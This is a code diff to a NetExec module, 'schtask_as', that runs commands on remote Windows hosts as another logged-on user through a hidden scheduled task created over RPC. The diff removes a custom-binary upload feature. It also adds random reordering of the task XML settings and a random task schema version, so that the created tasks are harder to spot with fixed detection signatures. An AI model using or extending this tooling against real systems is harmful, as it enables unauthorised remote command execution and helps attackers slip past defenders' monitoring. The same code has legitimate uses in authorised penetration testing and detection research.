@@ -1,5 +1,6 @@
-import os
 import contextlib
+import random
+import os
 from time import sleep
 from datetime import datetime, timedelta
 from impacket.dcerpc.v5.dtypes import NULL
@@ -8,39 +9,23 @@ from nxc.helpers.misc import gen_random_string
 from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
-
 class NXCModule:
     """
     Execute a scheduled task remotely as a already connected user by @Defte_
     Thanks @Shad0wC0ntr0ller for the idea of removing the hardcoded date that could be used as an IOC
-    Modified by @Defte_ so that output on multiples lines are printed correctly (28/04/2025)
-    Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
     """
 
     def options(self, context, module_options):
         r"""
-        BINARY         Upload the binary to be executed by CMD
         CMD            Command to execute
         USER           User to execute command as
         TASK           OPTIONAL: Set a name for the scheduled task name
         FILE           OPTIONAL: Set a name for the command output file
         LOCATION       OPTIONAL: Set a location for the command output file (e.g. '\tmp\')
-
-        Example:
-        -------
-        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami
-        nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe
         """
-        self.cmd = self.binary = self.user = self.task = self.file = self.location = self.time = None
-        self.share = "C$"
-        self.tmp_dir = "C:\\Windows\\Temp\\"
-        self.tmp_share = self.tmp_dir.split(":")[1]
-
+        self.cmd = self.user = self.task = self.file = self.location = self.time = None
         if "CMD" in module_options:
             self.cmd = module_options["CMD"]
-
-        if "BINARY" in module_options:
-            self.binary = module_options["BINARY"]
 
         if "USER" in module_options:
             self.user = module_options["USER"]
@@ -62,32 +47,13 @@ class NXCModule:
 
     def on_admin_login(self, context, connection):
         self.logger = context.log
-
         if self.cmd is None:
             self.logger.fail("You need to specify a CMD to run")
             return 1
-
         if self.user is None:
             self.logger.fail("You need to specify a USER to run the command as")
             return 1
 
-        if self.binary:
-            if not os.path.isfile(self.binary):
-                self.logger.fail(f"Cannot find {self.binary}")
-                return 1
-            else:
-                self.logger.display(f"Uploading {self.binary}")
-                with open(self.binary, "rb") as binary_to_upload:
-                    try:
-                        self.binary_name = os.path.basename(self.binary)
-                        connection.conn.putFile(self.share, f"{self.tmp_share}{self.binary_name}", binary_to_upload.read)
-                        self.logger.success(f"Binary {self.binary_name} successfully uploaded in {self.tmp_share}{self.binary_name}")
-                    except Exception as e:
-                        self.logger.fail(f"Error writing file to share {self.tmp_share}: {e}")
-                        return 1
-
-        # Returnes self.cmd or \Windows\temp\BinToExecute.exe depending if BINARY=BinToExecute.exe
-        self.cmd = self.cmd if not self.binary else f"{self.tmp_share}{self.cmd}"
         self.logger.display("Connecting to the remote Service control endpoint")
         try:
             exec_method = TSCH_EXEC(
@@ -121,8 +87,7 @@ class NXCModule:
                 # Required to decode specific French characters otherwise it'll print b"<result>"
                 output = output.decode("cp437")
             if output:
-                for line in output.splitlines():
-                    self.logger.highlight(line.rstrip())
+                self.logger.highlight(output)
 
         except Exception as e:
             if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
@@ -131,13 +96,8 @@ class NXCModule:
                     exec_method.deleteartifact()
             else:
                 self.logger.fail(f"Failed to execute command: {e}")
-        finally:
-            if self.binary:
-                try:
-                    connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.binary_name}")
-                    context.log.success(f"Binary {self.binary_name} successfully deleted")
-                except Exception as e:
-                    context.log.fail(f"Error deleting {self.binary_name} on {self.share}: {e}")
+
+
 
 
 class TSCH_EXEC:
@@ -218,8 +178,41 @@ class TSCH_EXEC:
         return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
 
     def gen_xml(self, command, fileless=False):
+        #Random setting order to help with detection
+        settings = [
+            "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>",
+            "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>",
+            "    <AllowHardTerminate>true</AllowHardTerminate>",
+            "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>",
+            "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>"
+        ]
+        random.shuffle(settings)
+        randomized_settings = "\n".join(settings)
+        
+        settings2 = [
+            "    <AllowStartOnDemand>true</AllowStartOnDemand>",
+            "    <Hidden>true</Hidden>",
+            "    <Enabled>true</Enabled>",
+            "    <RunOnlyIfIdle>false</RunOnlyIfIdle>",
+            "    <WakeToRun>false</WakeToRun>",
+            "    <Priority>7</Priority>",
+            "    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>"
+        ]
+        random.shuffle(settings2)
+        randomized_settings2 = "\n".join(settings2)
+        
+        IdleSettings = [
+            "      <StopOnIdleEnd>true</StopOnIdleEnd>",
+            "      <RestartOnIdle>false</RestartOnIdle>"
+        ]
+        random.shuffle(IdleSettings)
+        randomized_IdleSettings = "\n".join(IdleSettings)
+        
+        random_digit = random.randint(2, 6)
+        
+        
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+<Task version="1.{random_digit}" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <RegistrationTrigger>
       <EndBoundary>{self.get_end_boundary()}</EndBoundary>
@@ -232,22 +225,11 @@ class TSCH_EXEC:
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+{randomized_settings}
     <IdleSettings>
-      <StopOnIdleEnd>true</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
+{randomized_IdleSettings}
     </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>true</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
-    <Priority>7</Priority>
+{randomized_settings2}
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
@@ -288,7 +270,7 @@ class TSCH_EXEC:
         # Give self.task a random string as name if not already specified
         self.task = gen_random_string(8) if self.task is None else self.task
         xml = self.gen_xml(command, fileless)
-
+        
         self.logger.info(f"Task XML: {xml}")
         self.logger.info(f"Creating task \\{self.task}")
         try:
